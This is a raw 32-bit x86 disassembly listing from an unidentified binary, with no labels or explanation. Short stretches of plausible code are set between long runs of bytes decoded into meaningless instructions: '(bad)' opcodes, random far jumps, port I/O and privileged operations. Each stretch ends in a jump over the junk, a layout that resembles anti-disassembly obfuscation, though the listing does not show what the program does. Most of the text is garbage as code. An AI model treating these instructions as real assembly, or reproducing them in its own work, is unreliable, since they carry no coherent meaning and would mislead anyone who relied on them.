  41e3c5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e3c6:	stc    
  41e3c7:	adc    DWORD PTR [eax+eax*8-0x63],esp
  41e3cb:	xor    eax,0x3e914a94
  41e3d0:	inc    DWORD PTR [ebp+0x7a]
  41e3d3:	test   BYTE PTR [ebx+0x43],bl
  41e3d6:	xchg   ebx,eax
  41e3d7:	rcr    DWORD PTR ds:0x9e282659,cl
  41e3dd:	stos   BYTE PTR es:[edi],al
  41e3de:	push   esi
  41e3df:	outs   dx,BYTE PTR ds:[esi]
  41e3e0:	dec    ecx
  41e3e1:	mov    eax,ds:0xe9dbd92
  41e3e6:	xchg   ebx,eax
  41e3e7:	mov    al,ds:0x5f293673
  41e3ec:	pop    ebx
  41e3ed:	leave  
  41e3ee:	ret    0xc
  41e3f1:	push   ebp
  41e3f2:	mov    ebp,esp
  41e3f4:	jmp    0x41e4c2
  41e3f9:	sar    esp,0x14
  41e3fc:	out    dx,al
  41e3fd:	cmp    eax,0xc2fffbee
  41e402:	adc    bh,BYTE PTR [ebp-0x6b]
  41e405:	sub    BYTE PTR [ebp+0x6106650a],ch
  41e40b:	add    DWORD PTR [eax],eax
  41e40d:	mov    cl,0x0
  41e40f:	add    BYTE PTR [eax],al
  41e411:	inc    ecx
  41e412:	(bad)  
  41e413:	xchg   esi,eax
  41e414:	imul   edx,DWORD PTR [esi-0x29bfc19b],0x9c301912
  41e41e:	mov    cl,0x7c
  41e420:	inc    ebx
  41e421:	and    DWORD PTR [ecx-0x6e03e193],eax
  41e427:	add    al,0x82
  41e429:	xchg   DWORD PTR [esi-0xe2310bb],ebp
  41e42f:	mov    DWORD PTR [ebp-0xcd7f061],edi
  41e435:	es jmp 0x1f8:0xf940c480
  41e43d:	and    al,0x20
  41e43f:	imul   edx,DWORD PTR [edx-0xae819d8],0x901c90cf
  41e449:	pop    ss
  41e44a:	jl     0x41e3e5
  41e44c:	xor    BYTE PTR [ebx+ecx*1],dh
  41e44f:	enter  0x8756,0xab
  41e453:	enter  0xb18f,0x25
  41e457:	mov    ah,BYTE PTR [ebp+0x1c]
  41e45a:	iret   
  41e45b:	mov    ecx,0xfcf885fd
  41e460:	push   ecx
  41e461:	adc    BYTE PTR [edi+eiz*1],0x2b
  41e465:	out    dx,al
  41e466:	data16 daa 
  41e468:	imul   ecx,DWORD PTR [edi-0x51eab692],0x22
  41e46f:	fiadd  DWORD PTR [edx+0x43d5794e]
  41e475:	test   DWORD PTR [ebx+0x3f791e68],esi
  41e47b:	dec    DWORD PTR [edx-0x6645dab5]
  41e481:	popf   
  41e482:	mov    ch,0x3f
  41e484:	mov    eax,0x3ca728a4
  41e489:	stos   BYTE PTR es:[edi],al
  41e48a:	cmp    DWORD PTR [ebx+0x714d11b4],esp
  41e490:	or     ecx,DWORD PTR [esi-0x6647c245]
  41e496:	stc    
  41e497:	leave  
  41e498:	adc    eax,0x51ff29a
  41e49d:	and    eax,0x96df9adb
  41e4a2:	jl     0x41e4d3
  41e4a4:	imul   eax,DWORD PTR [ecx+edi*8-0x370e82b6],0x31
  41e4ac:	inc    esp
  41e4ad:	pusha  
  41e4ae:	and    al,0x20
  41e4b0:	inc    ebx
  41e4b1:	lds    ebx,FWORD PTR [eax+0x5c479f8c]
  41e4b7:	test   ebp,ebx
  41e4b9:	call   0xd524aa98
  41e4be:	ror    BYTE PTR [ebp+0x6a],cl
  41e4c1:	fiadd  DWORD PTR [ecx+0x90ec]
  41e4c7:	add    BYTE PTR [ebx-0x48f0f7bb],cl
  41e4cd:	or     eax,0x42f52c
  41e4d2:	adc    ecx,DWORD PTR ds:0x42f598
  41e4d8:	mov    DWORD PTR ds:0x42f52c,ecx
  41e4de:	mov    ecx,DWORD PTR [ebp+0xc]
  41e4e1:	sub    DWORD PTR ds:0x42f568,0x1e23
  41e4eb:	push   ebx
  41e4ec:	cmp    DWORD PTR ds:0x42f648,0x0
  41e4f3:	jg     0x41e51a
  41e4f9:	xor    DWORD PTR ds:0x42f648,0x341f
  41e503:	mov    ecx,DWORD PTR ds:0x42f600
  41e509:	and    DWORD PTR ds:0x42f598,ecx
  41e50f:	jmp    0x41e51a
  41e514:	call   DWORD PTR ds:0x4387d0
  41e51a:	push   esi
  41e51b:	jmp    0x41e5e9
  41e520:	in     eax,dx
  41e521:	cmp    DWORD PTR [esi+0x1c],0x7e
  41e525:	std    
  41e526:	out    dx,eax
  41e527:	repz cli 
  41e529:	(bad)  [ecx-0x38017071]
  41e52f:	in     al,0xb7
  41e531:	popa   
  41e532:	add    DWORD PTR [eax],eax
  41e534:	mov    cl,0x0
  41e536:	add    BYTE PTR [eax],al
  41e538:	ficom  WORD PTR [esi-0x2d30521c]
  41e53e:	fwait
  41e53f:	mov    dl,0xcf
  41e541:	gs pop ss
  41e543:	fidiv  DWORD PTR [ebp-0x738374b5]
  41e549:	rcl    WORD PTR [ecx],cl
  41e54c:	js     0x41e5a6
  41e54e:	adc    DWORD PTR [eax],0x3d6e19a5
  41e554:	aas    
  41e555:	out    dx,al
  41e556:	test   BYTE PTR [ecx+0x34d74fa8],cl
  41e55c:	mov    cl,BYTE PTR [ecx-0x2322e2c2]
  41e562:	mov    ebp,0x4a6cbb9
  41e567:	and    DWORD PTR [eax+0x75],edx
  41e56a:	aaa    
  41e56b:	mov    ds,WORD PTR [ebx+0xa9e961a]
  41e571:	aad    0x35
  41e573:	jns    0x41e574
  41e575:	dec    ebx
  41e576:	rol    BYTE PTR [edi],0x9b
  41e579:	adc    DWORD PTR [eax+ecx*1],eax
  41e57c:	xlat   BYTE PTR ds:[ebx]
  41e57d:	adc    al,0x3f
  41e57f:	lods   al,BYTE PTR ds:[esi]
  41e580:	loope  0x41e5f9
  41e582:	adc    esi,DWORD PTR [esi-0x21]
  41e585:	pop    ss
  41e586:	sbb    bl,cl
  41e588:	or     bl,BYTE PTR [esi-0x10]
  41e58b:	sbb    esi,DWORD PTR [eax-0x6e57b7af]
  41e591:	push   esp
  41e592:	jmp    0xc6c5:0xd559248f
  41e599:	mov    ds:0x6a23a618,al
  41e59e:	sti    
  41e59f:	sbb    ah,dh
  41e5a1:	mov    ebp,ecx
  41e5a3:	out    dx,eax
  41e5a4:	mov    WORD PTR [ebx+0x61b22e6b],fs
  41e5aa:	xchg   ecx,eax
  41e5ab:	stos   DWORD PTR es:[edi],eax
  41e5ac:	dec    ebp
  41e5ad:	jno    0x41e55f
  41e5af:	xchg   edi,eax
  41e5b0:	push   es
  41e5b1:	xor    BYTE PTR [eax],dh
  41e5b3:	xor    al,0xd3
  41e5b5:	push   edx
  41e5b6:	sub    eax,0x16b509b6
  41e5bb:	xchg   edi,eax
  41e5bc:	adc    edx,DWORD PTR [eax+0x5eb98388]
  41e5c2:	mov    ds:0x2231f74d,eax
  41e5c7:	test   eax,0xc66e669
  41e5cc:	call   0xbd79c5b0
  41e5d1:	daa    
  41e5d2:	(bad)  
  41e5d3:	adc    ah,dh
  41e5d5:	push   ebx
  41e5d6:	pop    eax
  41e5d7:	jno    0x41e59f
  41e5d9:	sbb    eax,0x56eebfea
  41e5de:	add    BYTE PTR [edi+0x4c75d1d1],0x68
  41e5e5:	dec    edi
  41e5e6:	jg     0x41e571
  41e5e8:	or     al,0xbe
  41e5ea:	pusha  
  41e5eb:	shr    BYTE PTR [ebp+ecx*4+0xc9e9],cl
  41e5f2:	add    BYTE PTR [ebx-0x413ec5c1],bh
  41e5f8:	(bad)  
  41e5fb:	sar    DWORD PTR [ecx+0x59c7dee2],1
  41e601:	mov    DWORD PTR [ecx+0x68],ebp
  41e604:	bound  eax,QWORD PTR [ecx]
  41e606:	add    BYTE PTR [ecx-0x36000000],dh
  41e60c:	mov    eax,0x982287d5
  41e611:	mov    ch,0xdf
  41e613:	inc    ebx
  41e614:	arpl   WORD PTR [edi-0x6],bx
  41e617:	inc    esp
  41e618:	inc    esp
  41e619:	stos   DWORD PTR es:[edi],eax
  41e61a:	xlat   BYTE PTR ds:[ebx]
  41e61b:	cmp    edi,edi
  41e61d:	adc    BYTE PTR [ebx-0x40],dh
  41e620:	jo     0x41e677
  41e622:	int    0x4e
  41e624:	xchg   esp,eax
  41e625:	shl    ah,1
  41e627:	xchg   edi,eax
  41e628:	add    edi,DWORD PTR [edi+0x25d6ce59]
  41e62e:	leave  
  41e62f:	lods   eax,DWORD PTR ds:[esi]
  41e630:	xchg   DWORD PTR [esi-0x22],edx
  41e633:	sbb    eax,0xd734c61e
  41e638:	jnp    0x41e622
  41e63a:	mov    ah,0x63
  41e63c:	push   ds
  41e63d:	in     al,dx
  41e63e:	and    DWORD PTR ds:0x5ad67801,0xfffffffc
  41e645:	cmp    al,0x33
  41e647:	pop    esp
  41e648:	xchg   esi,eax
  41e649:	mov    ebp,0x399b97b6
  41e64e:	std    
  41e64f:	(bad)  
  41e651:	xchg   ebx,eax
  41e652:	fdiv   DWORD PTR [ebp-0x7662453c]
  41e658:	jmp    0xa9706943
  41e65d:	sub    esp,DWORD PTR [ebx+0x6b0d4dc0]
  41e663:	jmp    0xe47377b3
  41e668:	xlat   BYTE PTR ds:[ebx]
  41e669:	pop    edi
  41e66a:	sub    al,0x5c
  41e66c:	xor    ecx,DWORD PTR [esp+edi*8+0x7]
  41e670:	sub    eax,0x29482d04
  41e675:	(bad)  
  41e676:	std    
  41e677:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e678:	jns    0x41e67e
  41e67a:	adc    eax,0x963087c5
  41e67f:	sub    DWORD PTR [ebp+0x35],ebp
  41e682:	ret    0x4744
  41e685:	test   eax,0xff577c86
  41e68a:	repz dec esi
  41e68c:	lahf   
  41e68d:	iret   
  41e68e:	jb     0x41e654
  41e690:	data16 jecxz 0x41e674
  41e693:	aam    0x60
  41e695:	sub    al,0x11
  41e697:	pop    edi
  41e698:	mov    al,0xc3
  41e69a:	inc    ebx
  41e69b:	out    dx,eax
  41e69c:	sbb    bl,ch
  41e69e:	sti    
  41e69f:	sbb    al,0xdd
  41e6a1:	mov    ss,WORD PTR [ebx+0x2a01e012]
  41e6a7:	in     eax,dx
  41e6a8:	jl     0x41e6a9
  41e6aa:	leave  
  41e6ab:	fnstcw WORD PTR [ebx]
  41e6ad:	and    ebx,DWORD PTR [eax+ebx*4-0x62]
  41e6b1:	enter  0x861e,0x71
  41e6b5:	aas    
  41e6b6:	mov    esp,0x79fb40b8
  41e6bb:	dec    eax
  41e6bc:	xor    eax,esi
  41e6be:	push   edi
  41e6bf:	mov    edi,0x66479db3
  41e6c4:	and    ebx,0x2284
  41e6ca:	sub    eax,edi
  41e6cc:	not    ebx
  41e6ce:	mov    DWORD PTR [ebp-0x44],eax
  41e6d1:	jmp    0x41e79f
  41e6d6:	ficom  DWORD PTR [edx+0x44]
  41e6d9:	push   0xf2fe7ecc
  41e6de:	add    eax,0xb69f054f
  41e6e3:	je     0x41e749
  41e6e5:	mov    ebx,0x16319
  41e6ea:	mov    cl,0x0
  41e6ec:	add    BYTE PTR [eax],al
  41e6ee:	sar    BYTE PTR [edx-0x19],1
  41e6f1:	dec    edx
  41e6f2:	(bad)  [edx]
  41e6f4:	and    DWORD PTR [ebx+0x78],eax
  41e6f7:	inc    ebp
  41e6f8:	and    dl,BYTE PTR [ebp+0x17b66e1c]
  41e6fe:	addr16 bnd jae 0x41e718
  41e702:	iret   
  41e703:	int3   
  41e704:	lods   al,BYTE PTR ds:[esi]
  41e705:	xchg   edx,eax
  41e706:	mov    cl,0xcb
  41e708:	mov    eax,0x3d3fdbfa
  41e70d:	or     BYTE PTR [eax+0x1b5179e0],ah
  41e713:	xor    al,BYTE PTR [eax]
  41e715:	sbb    bh,BYTE PTR ds:0x36065668
  41e71b:	jb     0x41e6ac
  41e71d:	call   0xf5e2e6ee
  41e722:	sbb    BYTE PTR [ecx-0x15],bl
  41e725:	pop    ebp
  41e726:	daa    
  41e727:	mov    DWORD PTR [eax],ebp
  41e729:	xchg   edx,eax
  41e72a:	mov    ds:0x22f3452e,al
  41e72f:	sbb    BYTE PTR [ecx],ch
  41e731:	pushf  
  41e732:	enter  0x571b,0x3a
  41e736:	or     ebx,DWORD PTR [ebx-0x7607656d]
  41e73c:	pcmpgtb mm5,mm6
  41e73f:	xchg   ebp,eax
  41e740:	enter  0x36c5,0xf
  41e744:	cmp    cl,BYTE PTR [edi-0x26]
  41e747:	lds    ebp,FWORD PTR [esp+edi*2]
  41e74a:	adc    eax,0xc4c47069
  41e74f:	xor    al,0x1d
  41e751:	mul    DWORD PTR [ebx]
  41e753:	es jmp 0xf671:0x4a32ce40
  41e75b:	aaa    
  41e75c:	mov    al,0xa7
  41e75e:	adc    BYTE PTR fs:[edi*4+0x297c6747],bh
  41e766:	pop    esp
  41e767:	inc    ecx
  41e768:	test   ebp,0x52893c3c
  41e76e:	pop    es
  41e76f:	es scas eax,DWORD PTR es:[edi]
  41e771:	dec    ebp
  41e772:	bound  ebx,QWORD PTR [esi]
  41e774:	mov    eax,ds:0x3b85adf7
  41e779:	popa   
  41e77a:	inc    esp
  41e77b:	mov    cl,0xa0
  41e77d:	pusha  
  41e77e:	mov    ecx,0x8eb89f74
  41e783:	xor    al,0x6d
  41e785:	inc    ebp
  41e786:	(bad)  
  41e787:	jle    0x41e775
  41e789:	jo     0x41e721
  41e78b:	outs   dx,BYTE PTR ds:[esi]
  41e78c:	jo     0x41e787
  41e78e:	aad    0x33
  41e790:	fs inc edi
  41e792:	jecxz  0x41e761
  41e794:	xor    eax,0x5aabe5b4
  41e799:	xchg   esp,eax
  41e79a:	mov    esp,0x667abc62
  41e79f:	mov    eax,DWORD PTR [ebp+0x8]
  41e7a2:	neg    ebx
  41e7a4:	mov    ecx,DWORD PTR [ebp+0xc]
  41e7a7:	and    DWORD PTR ds:0x42f56c,0x1640
  41e7b1:	xor    eax,esi
  41e7b3:	sub    eax,edi
  41e7b5:	sbb    DWORD PTR ds:0x42f5ac,0x202e
  41e7bf:	mov    DWORD PTR [ebp-0x44],eax
  41e7c2:	jmp    0x41e890
  41e7c7:	or     al,BYTE PTR [esi+0x7ade7ad6]
  41e7cd:	scas   al,BYTE PTR es:[edi]
  41e7ce:	idiv   cl
  41e7d0:	push   edx
  41e7d1:	mov    gs,WORD PTR [esi+0x72]
  41e7d4:	ss push ds
  41e7d6:	bswap  edx
  41e7d8:	arpl   WORD PTR [ecx],ax
  41e7da:	add    BYTE PTR [ecx-0x1b000000],dh
  41e7e0:	fcmovbe st,st(2)
  41e7e2:	(bad)  
  41e7e3:	int    0x47
  41e7e5:	sbb    edx,DWORD PTR [esi+0x75]
  41e7e8:	pop    esi
  41e7e9:	xor    BYTE PTR [edi-0x6e],0x18
  41e7ed:	jbe    0x41e869
  41e7ef:	jb     0x41e83f
  41e7f1:	inc    ebx
  41e7f2:	and    bh,cl
  41e7f4:	xchg   ecx,ecx
  41e7f6:	jl     0x41e82c
  41e7f8:	outs   dx,DWORD PTR ds:[esi]
  41e7f9:	inc    eax
  41e7fa:	mov    dl,0x88
  41e7fc:	cmp    cl,BYTE PTR [edx]
  41e7fe:	ds loopne 0x41e831
  41e801:	dec    esi
  41e802:	call   FWORD PTR [eax+ecx*2]
  41e805:	jnp    0x41e874
  41e807:	push   esi
  41e808:	push   0x4
  41e80a:	sub    DWORD PTR [ebx],esp
  41e80c:	sbb    BYTE PTR [ecx-0x40],0xd5
  41e810:	cld    
  41e811:	ja     0x41e856
  41e813:	or     DWORD PTR [edi],esi
  41e815:	mov    al,0xe9
  41e817:	mov    al,ch
  41e819:	mov    ecx,DWORD PTR [edi+edi*1]
  41e81c:	div    BYTE PTR [edx-0x7b0e0fb6]
  41e822:	and    esi,DWORD PTR [edx+0xc3b4183]
  41e828:	rcl    DWORD PTR [ebx-0x4a],1
  41e82b:	dec    ebp
  41e82c:	test   DWORD PTR [edx],edx
  41e82e:	jmp    0x73d3:0x2fd451fb
  41e835:	and    BYTE PTR [esi],0xc7
  41e838:	jmp    DWORD PTR [bp+di-0x72]
  41e83c:	imul   edx,DWORD PTR [ebp+0x79],0xffffffcf
  41e840:	sbb    DWORD PTR [ebx+0x2cee34c3],0x316d6fd2
  41e84a:	push   ecx
  41e84b:	mov    esp,?
  41e84d:	dec    eax
  41e84e:	dec    ebx
  41e84f:	jo     0x41e831
  41e851:	ret    0xbe3e
  41e854:	or     al,0x17
  41e856:	xor    DWORD PTR [esi],esi
  41e858:	pop    eax
  41e859:	and    ah,al
  41e85b:	sbb    eax,0xcf5eb2ae
  41e860:	mov    cl,BYTE PTR [eax-0x5a]
  41e863:	pop    es
  41e864:	hlt    
  41e865:	dec    edx
  41e866:	xchg   ebx,eax
  41e867:	mov    ebp,0x768dc499
  41e86c:	add    al,0x8a
  41e86e:	je     0x41e7f8
  41e870:	sub    DWORD PTR [edx+0x2f],0x90139506
  41e877:	mov    al,0x91
  41e879:	and    eax,0xb8942b9a
  41e87e:	arpl   si,si
  41e880:	fwait
  41e881:	test   ebp,esp
  41e883:	div    DWORD PTR [esi+0x65]
  41e886:	and    BYTE PTR [eax-0x7089f8d],bh
  41e88c:	jp     0x41e80e
  41e88e:	or     eax,0xf034a1db
  41e893:	inc    edx
  41e894:	add    BYTE PTR [ebx+0x45894100],cl
  41e89a:	shr    cl,0xc9
  41e89d:	add    BYTE PTR [eax],al
  41e89f:	add    dl,cl
  41e8a1:	and    eax,0xffff74da
  41e8a6:	out    dx,al
  41e8a7:	mov    edi,0x3300143b
  41e8ac:	add    DWORD PTR [ebx+0x2b],ebx
  41e8af:	jo     0x41e92c
  41e8b1:	add    DWORD PTR fs:[eax],eax
  41e8b4:	mov    cl,0x0
  41e8b6:	add    BYTE PTR [eax],al
  41e8b8:	adc    bh,al
  41e8ba:	mov    al,0x61
  41e8bc:	lahf   
  41e8bd:	test   ch,cl
  41e8bf:	dec    esp
  41e8c0:	ficomp DWORD PTR [ebx+0x3342d98]
  41e8c6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e8c7:	iret   
  41e8c8:	into   
  41e8c9:	popa   
  41e8ca:	(bad)  
  41e8cb:	fimul  DWORD PTR [ebp+0x27b7a0dc]
  41e8d1:	pushf  
  41e8d2:	pop    esp
  41e8d3:	pop    edx
  41e8d4:	(bad)  
  41e8d5:	js     0x41e8ba
  41e8d7:	xchg   esp,eax
  41e8d8:	sub    al,0x1a
  41e8da:	in     al,0xbe
  41e8dc:	sbb    DWORD PTR [esi+eiz*2],ebp
  41e8df:	(bad)  
  41e8e0:	fisub  DWORD PTR [eax-0x5b5b2bb4]
  41e8e6:	mov    bl,0xf
  41e8e8:	sbb    BYTE PTR [edi-0xdc28e8c],ch
  41e8ee:	sahf   
  41e8ef:	add    BYTE PTR [esi-0x38a9ceda],bh
  41e8f5:	mov    es,WORD PTR [ebx-0x80]
  41e8f8:	mov    dl,0xf8
  41e8fa:	test   al,0xc9
  41e8fc:	inc    ecx
  41e8fd:	stos   BYTE PTR es:[edi],al
  41e8fe:	stc    
  41e8ff:	scas   al,BYTE PTR es:[edi]
  41e900:	adc    eax,0x1bc198fe
  41e905:	inc    edi
  41e906:	and    DWORD PTR [esi+0xef27192],ebp
  41e90c:	xchg   ebx,eax
  41e90d:	mov    bl,0x61
  41e90f:	pop    eax
  41e910:	inc    esi
  41e911:	xor    cl,BYTE PTR [ebx-0x14df2bd1]
  41e917:	stos   BYTE PTR es:[edi],al
  41e918:	fdiv   DWORD PTR ds:[edx]
  41e91b:	mov    cl,0xcd
  41e91d:	pop    esi
  41e91e:	and    eax,0xccb68db7
  41e923:	rcr    BYTE PTR [ecx],cl
  41e925:	lds    esp,FWORD PTR [ecx-0x2c3d1ae5]
  41e92b:	daa    
  41e92c:	mov    esi,?
  41e92e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e92f:	and    eax,0x8546dbe6
  41e934:	mov    esi,0xa495b8dc
  41e939:	push   ebx
  41e93a:	dec    ebp
  41e93b:	sbb    BYTE PTR [ebx],bh
  41e93d:	test   DWORD PTR [eax+0x7a76bb72],ebp
  41e943:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e944:	adc    ebx,DWORD PTR [edx-0x435d81b8]
  41e94a:	neg    DWORD PTR [edi]
  41e94c:	jae    0x41e8d4
  41e94e:	test   DWORD PTR [ecx-0xa],ebp
  41e951:	mov    eax,ds:0x2bf9c48
  41e956:	or     dh,ah
  41e958:	adc    eax,0xcbc9b15b
  41e95d:	ficom  WORD PTR [edi]
  41e95f:	int3   
  41e960:	cmp    BYTE PTR [ebx+eax*2+0x54],ah
  41e964:	iret   
  41e965:	push   esi
  41e966:	aas    
  41e967:	jne    0x41e9aa
  41e969:	mov    eax,ds:0x42f244
  41e96e:	and    DWORD PTR ds:0x42f540,ecx
  41e974:	mov    eax,DWORD PTR [eax]
  41e976:	mov    DWORD PTR [ebp-0x3c],eax
  41e979:	mov    eax,DWORD PTR [ebp-0x40]
  41e97c:	adc    ecx,0x2abc
  41e982:	xor    edx,edx
  41e984:	or     DWORD PTR ds:0x42f574,0x66aa
  41e98e:	add    eax,edi
  41e990:	jmp    0x41ea5e
  41e995:	and    BYTE PTR [edx+0x6ffe61fc],dh
  41e99b:	mov    ebp,0x248ba9f3
  41e9a0:	imul   edx,DWORD PTR [ebp-0x49],0x652c3fe1
  41e9a7:	add    DWORD PTR [eax],eax
  41e9a9:	mov    cl,0x0
  41e9ab:	add    BYTE PTR [eax],al
  41e9ad:	xchg   edx,eax
  41e9ae:	inc    ecx
  41e9af:	mov    ebp,0xbafcec2c
  41e9b4:	inc    ecx
  41e9b5:	and    eax,0x57d01748
  41e9ba:	mov    ebp,0x1282e389
  41e9bf:	loope  0x41e980
  41e9c1:	xchg   ebx,eax
  41e9c2:	call   0x11b0:0x4be73cb2
  41e9c9:	icebp  
  41e9ca:	sbb    edx,ebx
  41e9cc:	into   
  41e9cd:	mov    ecx,0x331308c0
  41e9d2:	adc    esp,DWORD PTR [eax]
  41e9d4:	daa    
  41e9d5:	in     al,dx
  41e9d6:	ja     0x41e9b3
  41e9d8:	xchg   ebx,eax
  41e9d9:	fistp  QWORD PTR [eax]
  41e9db:	mov    cl,0x94
  41e9dd:	mov    esi,0x96d9675c
  41e9e2:	bound  edi,QWORD PTR [edi-0x1f]
  41e9e5:	(bad)  
  41e9e6:	push   eax
  41e9e7:	xchg   edx,eax
  41e9e8:	sbb    eax,DWORD PTR [ebx-0x4e]
  41e9eb:	call   0x78a52401
  41e9f0:	adc    bh,0x4d
  41e9f3:	call   0xc1fa94fa
  41e9f8:	xor    WORD PTR [ecx+0x64f20afa],di
  41e9ff:	retf   0x27ff
  41ea02:	pop    eax
  41ea03:	test   eax,0xcd4bf91d
  41ea08:	mov    BYTE PTR [edx+0x75],dh
  41ea0b:	dec    ecx
  41ea0c:	fucomi st,st(3)
  41ea0e:	mov    edx,ecx
  41ea10:	fsub   QWORD PTR [edx+esi*2-0x1306896e]
  41ea17:	lahf   
  41ea18:	pop    esi
  41ea19:	and    eax,0xc0e981fb
  41ea1e:	add    eax,ebx
  41ea20:	xchg   edi,eax
  41ea21:	icebp  
  41ea22:	jns    0x41ea0c
  41ea24:	add    eax,edi
  41ea26:	pop    edi
  41ea27:	jmp    DWORD PTR [ecx-0x71a0a909]
  41ea2d:	push   ebx
  41ea2e:	sti    
  41ea2f:	jns    0x41e9ff
  41ea31:	mov    ebp,DWORD PTR [ebx]
  41ea33:	jl     0x41e9e1
  41ea35:	jns    0x41ea03
  41ea37:	outs   dx,DWORD PTR ds:[esi]
  41ea38:	call   0x556098e
  41ea3d:	cmc    
  41ea3e:	or     BYTE PTR [ebx+0x4fe6331d],al
  41ea44:	cmc    
  41ea45:	xchg   esp,eax
  41ea46:	gs push ss
  41ea48:	mov    al,0x0
  41ea4a:	xlat   BYTE PTR ds:[ebx]
  41ea4b:	ds mov esi,?
  41ea4e:	jge    0x41ea61
  41ea50:	mov    esp,fs
  41ea52:	xchg   esp,eax
  41ea53:	push   eax
  41ea54:	jbe    0x41ea09
  41ea56:	ins    BYTE PTR es:[edi],dx
  41ea57:	lods   al,BYTE PTR ds:[esi]
  41ea58:	sti    
  41ea59:	arpl   bp,ax
  41ea5b:	xor    al,0xa3
  41ea5d:	pop    ds
  41ea5e:	adc    edx,0xffff7223
  41ea64:	mov    ecx,0xacff
  41ea69:	xor    edx,ecx
  41ea6b:	cmp    DWORD PTR ds:0x42f5fc,0x0
  41ea72:	jle    0x41ea8c
  41ea78:	or     DWORD PTR ds:0x42f62c,edi
  41ea7e:	jmp    0x41ea8c
  41ea83:	push   DWORD PTR [ebp-0x14]
  41ea86:	call   DWORD PTR ds:0x4387f4
  41ea8c:	mov    DWORD PTR [ebp-0x24],edx
  41ea8f:	mov    edx,DWORD PTR [ebp+0x8]
  41ea92:	mov    ebx,DWORD PTR [ebp+0xc]
  41ea95:	xor    eax,esi
  41ea97:	jmp    0x41eb65
  41ea9c:	shl    BYTE PTR [eax-0x54],0xf7
  41eaa0:	mov    esp,0x7177dbff
  41eaa5:	sbb    al,0xdd
  41eaa7:	or     eax,0x4ec8ac29
  41eaac:	frstor [ebp+0x1]
  41eaaf:	add    BYTE PTR [ecx-0x15000000],dh
  41eab5:	mov    ecx,ecx
  41eab7:	pop    ebx
  41eab8:	(bad)  
  41eab9:	out    dx,eax
  41eaba:	mov    ebx,0x1f71f35a
  41eabf:	pushf  
  41eac0:	lods   eax,DWORD PTR ds:[esi]
  41eac1:	shl    BYTE PTR [esi],cl
  41eac3:	int    0x5c
  41eac5:	mov    eax,ds:0xc2a45996
  41eaca:	xchg   DWORD PTR [esi],edi
  41eacc:	mov    ecx,0x90123315
  41ead1:	cwde   
  41ead2:	lea    ecx,[ecx+0xc]
  41ead5:	mov    esp,DWORD PTR [ecx+0x595209a1]
  41eadb:	add    eax,0x3ae3cf90
  41eae0:	mov    edi,0xd7613f29
  41eae5:	icebp  
  41eae6:	sbb    al,0xbf
  41eae8:	or     BYTE PTR [eax],al
  41eaea:	or     ebx,DWORD PTR [esp+ebp*2]
  41eaed:	shl    eax,cl
  41eaef:	in     al,0x9f
  41eaf1:	ror    BYTE PTR [esi+0x5aac7fed],cl
  41eaf7:	mov    bl,0xf9
  41eaf9:	xchg   ebx,eax
  41eafa:	and    cl,ch
  41eafc:	sbb    DWORD PTR [esi+0x38363afe],ebx
  41eb02:	adc    al,0xfa
  41eb04:	out    0x5f,al
  41eb06:	mov    ds:0x1c4993a8,eax
  41eb0b:	inc    edx
  41eb0c:	shl    ch,cl
  41eb0e:	fidiv  DWORD PTR [edi+0x393e513b]
  41eb14:	(bad)  
  41eb15:	dec    ebp
  41eb16:	test   bl,dl
  41eb18:	mov    edi,0x5786766f
  41eb1d:	stos   DWORD PTR es:[edi],eax
  41eb1e:	mov    dl,0x7d
  41eb20:	fwait
  41eb21:	repz (bad) 
  41eb23:	jmp    0x41eb93
  41eb25:	aad    0x75
  41eb27:	jmp    0xd0dd239b
  41eb2c:	push   edx
  41eb2d:	push   edx
  41eb2e:	push   es
  41eb2f:	cli    
  41eb30:	xor    bh,dh
  41eb32:	push   cs
  41eb33:	scas   al,BYTE PTR es:[edi]
  41eb34:	xor    al,0x8d
  41eb36:	jnp    0x41eba9
  41eb38:	mov    ebp,0x1d1ffcbd
  41eb3d:	cli    
  41eb3e:	shl    cl,0x69
  41eb41:	enter  0x8ce4,0x33
  41eb45:	out    dx,al
  41eb46:	int3   
  41eb47:	pop    esi
  41eb48:	adc    BYTE PTR [ebp+eiz*1-0x25],ah
  41eb4c:	test   edi,0xa10e8ca4
  41eb52:	inc    esp
  41eb53:	mov    eax,ds:0x91b5e2c4
  41eb58:	pop    esp
  41eb59:	enter  0x3019,0x85
  41eb5d:	test   BYTE PTR [ebp-0x49],0xae
  41eb61:	fwait
  41eb62:	or     al,0x18
  41eb64:	xchg   BYTE PTR [ecx+0x45c7cc5d],cl
  41eb6a:	rol    BYTE PTR [edx-0x26],1
  41eb6d:	stos   DWORD PTR es:[edi],eax
  41eb6e:	dec    edx
  41eb6f:	jmp    0x41ec3d
  41eb74:	enter  0x9a26,0x9a
  41eb78:	(bad)  
  41eb79:	mov    esi,0xf4c576c8
  41eb7e:	out    0x67,al
  41eb80:	sub    eax,0x8e678b54
  41eb85:	add    WORD PTR [eax],ax
  41eb88:	mov    cl,0x0
  41eb8a:	add    BYTE PTR [eax],al
  41eb8c:	mov    BYTE PTR [ecx-0x25c8d95f],bl
  41eb92:	ror    DWORD PTR [esp+eax*2-0x57],0x4f
  41eb97:	ins    BYTE PTR es:[edi],dx
  41eb98:	icebp  
  41eb99:	enter  0x407a,0x20
  41eb9d:	div    ecx
  41eb9f:	cmp    eax,0x38786805
  41eba4:	imul   ebp,DWORD PTR [esi+0x5d],0xffffffdf
  41eba8:	out    dx,eax
  41eba9:	jmp    0x25acb969
  41ebae:	repz std 
  41ebb0:	sbb    DWORD PTR [esi+0x43],edx
  41ebb3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ebb4:	fwait
  41ebb5:	mov    eax,cs:0x1ab27cc7
  41ebbb:	mov    bh,0x72
  41ebbd:	dec    ebp
  41ebbe:	out    0x3a,al
  41ebc0:	cmp    edi,esi
  41ebc2:	add    edx,DWORD PTR [edx-0x75]
  41ebc5:	jno    0x41eb87
  41ebc7:	add    eax,0xc3d732f0
  41ebcc:	scas   eax,DWORD PTR es:[edi]
  41ebcd:	stc    
  41ebce:	push   edx
  41ebcf:	jnp    0x41eb99
  41ebd1:	xchg   ecx,eax
  41ebd2:	aas    
  41ebd3:	cmc    
  41ebd4:	push   cs
  41ebd5:	xor    DWORD PTR [esi-0x25a8b9fc],esp
  41ebdb:	jge    0x41ec44
  41ebdd:	jne    0x41ebb9
